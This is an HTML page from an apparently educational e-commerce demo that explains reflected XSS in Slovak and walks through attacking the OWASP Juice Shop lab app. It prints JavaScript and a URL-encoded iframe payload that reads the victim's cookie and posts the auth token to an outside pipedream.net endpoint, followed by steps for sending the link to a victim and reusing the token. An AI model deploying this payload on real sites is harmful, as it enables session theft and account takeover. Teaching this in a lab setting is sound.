<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Attacks</title>
    <!-- font-awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css"
    />

    <!-- styles css -->
    <link rel="stylesheet" href="../../../../styles.css" />
  </head>

  <body>
  <nav class="navbar page">
    <div class="nav-center">
      <!-- links -->
      <div>
        <button class="toggle-nav">
          <i class="fas fa-bars"></i>
        </button>
        <ul class="nav-links">
          <li>
            <a href="/js-e-commerce/index.html" class="nav-link"> home </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/products/products.html" class="nav-link"> products </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/about/about.html" class="nav-link"> about </a>
          </li>
          <li>
            <a href="/js-e-commerce/src/pages/attacks/attacks.html" class="nav-link attacks"> attacks </a>
          </li>
        </ul>
      </div>

      <p class="user-name"></p>

      <button class="log-out__button" id="signOutButton">
        <a href="../auth/login.html" id="log-out__link">Log out</a>
      </button>

      <div class="toggle-container">
        <button class="toggle-cart">
          <i class="fas fa-shopping-cart"></i>
        </button>
        <span class="cart-item-count">1</span>
      </div>
    </div>
  </nav>
  <section class="page-hero">
    <div class="section-center">
      <h3 class="page-hero-title">Home / Attacks</h3>
    </div>
  </section>
  <div class="sidebar-overlay">
    <aside class="sidebar">
      <!-- close -->
      <button class="sidebar-close">
        <i class="fas fa-times"></i>
      </button>
      <!-- links -->
      <ul class="sidebar-links">
        <li>
          <a href="/js-e-commerce/index.html" class="sidebar-link">
            <i class="fas fa-home fa-fw"></i>
            home
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/products/products.html" class="sidebar-link">
            <i class="fas fa-couch fa-fw"></i>
            products
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/about/about.html" class="sidebar-link">
            <i class="fas fa-book fa-fw"></i>
            about
          </a>
        </li>
        <li>
          <a href="/js-e-commerce/src/pages/attacks/attacks.html" class="sidebar-link attacks">
            <i class="fas fa-book fa-fw"></i>
            attacks
          </a>
        </li>
      </ul>
    </aside>
  </div>
    <div class="cart-overlay">
      <aside class="cart">
        <button class="cart-close">
          <i class="fas fa-times"></i>
        </button>
        <header>
          <h3 class="text-slanted">your bag</h3>
        </header>
        <!-- cart items -->
        <div class="cart-items"></div>
        <!-- footer -->
        <footer>
          <h3 class="cart-total text-slanted">total : $12.99</h3>
          <button class="cart-checkout btn">checkout</button>
        </footer>
      </aside>
    </div>
    <section class="section section-center attacks-page">
      <br/>
      <h3>Reflected XSS</h3>
      <div class="attack-about">
        <br>Reflcted XSS útok je najbežnejším typom útoku XSS, napriek tomu je pomerne
        jednoduchým na detekciu. Pri reflcted XSS útoku sa kód odošle na server a vráti sa
        použivateľovi v rámci jednej HTTP požiadavky. Kód je vložený ako paramater url pre
        HTTP požiadavku a server po vykonaní požiadavky vracia neošetrený kód, ktroý sa priamo
        reflektuje na stránke. Takýto skript je vložený do DOM a vykoná sa čokoľvek, čo je v tele
        script tagu.
        <br><br>
      </div>
      <br/>
      <h3>Instructions</h3><br>
      <ol>
        <li>Utok prevedieme pomocou systemu juice-shop, ktoreho instalaciu najdeme ty -> <a href="https://github.com/juice-shop/juice-shop#from-sources">juice-shop</a>.</li>
        <li>Po spusteni aplikacie a zaregistrovani sa prejdeme do sekcii v menu "Obejdnavky a platby".</li>
        <li>V url sa nam zobrazuju objednavky podla id, kde na obrazovke vyhladanej objednavky sa taktiez zobrazuje id objednavky.</li>
        <li>Tento design pattern ma potencionalnu zranitelnost a to, ze vpisujeme neoverny vstup priamo do DOM stranky.</li>
        <li>V zdrojovom kode juice-shopu v komponente track-result.component.html (angular komponent) je hodnota id vkladana do DOM cez zranitelnu metodu <i>innerHTML</i>. To nam v pripade neoverenia vstupu umoznuje aplikovat reflected XSS utok.</li>
        <li>Do url parametru mozeme teda vlozit skodlivy kod a ten bude priamo vlozeny do tela stranky.</li>
        <li><pre>`
          const headers = new Headers();
          headers.append("Content-Type", "text/plain");

          const body = {
          test: "event",
          };

          const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: document.cookie.split("")[4].split("=")[1],
          };

          fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);`
        </pre></li>
        <li>Kod potrebujeme preformatovat aby ho prehliadac vedel prijat ako validny parameter, vlozit do <i>iframe</i> tagu ako javascript a takto upraveny ho mozeme vlozit do url.</li>
        <li><pre>
          <a href="http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
          ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
          %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
          .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
          net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E">
          http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
          ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
          %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
          .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
          net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E
          </a>
        </pre></li>
        <li>Skopirovanu url mozeme poslat obeti a ta, v pripade ze je prihlasena v systeme, omylom odosle na nas endpoint autentifikacny token.</li>
        <li>Ziskany token vlozime do local storageu appky a tymto sposobom sme sa prihlasali do uctu obete.</li>
      </ol>
      <div class="video__wrapper">
        <video controls >
          <source src="/js-e-commerce/src/assets/videos/reflected-xss.mov" type="video/mp4">
          Your browser does not support the video tag.
        </video>
      </div>
    </section>
  <script type="module" src="/js-e-commerce/src/pages/auth/auth.js"></script>
  <script type="module" src="/js-e-commerce/src/cart/setupCart.js"></script>
  </body>
</html>
